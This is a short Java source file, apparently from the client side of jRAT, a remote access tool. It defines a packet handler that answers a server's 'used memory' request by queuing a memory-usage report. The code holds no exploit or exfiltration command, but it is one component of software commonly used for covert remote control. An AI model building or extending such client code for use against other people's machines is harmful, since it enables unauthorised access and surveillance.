package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet24UsedMemory;

public class Packet33UsedMemory extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.addToSendQueue(new Packet24UsedMemory());
	}

}
